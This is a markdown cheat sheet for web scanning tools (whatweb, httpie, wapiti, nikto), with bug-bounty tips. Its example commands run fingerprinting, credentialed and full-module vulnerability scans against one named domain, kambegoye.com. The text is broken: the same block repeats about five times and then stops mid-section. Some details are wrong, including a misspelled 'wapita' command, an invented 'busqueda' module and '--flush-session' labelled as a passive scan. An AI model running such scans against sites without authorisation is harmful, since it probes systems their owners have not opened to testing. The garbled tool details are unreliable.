**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
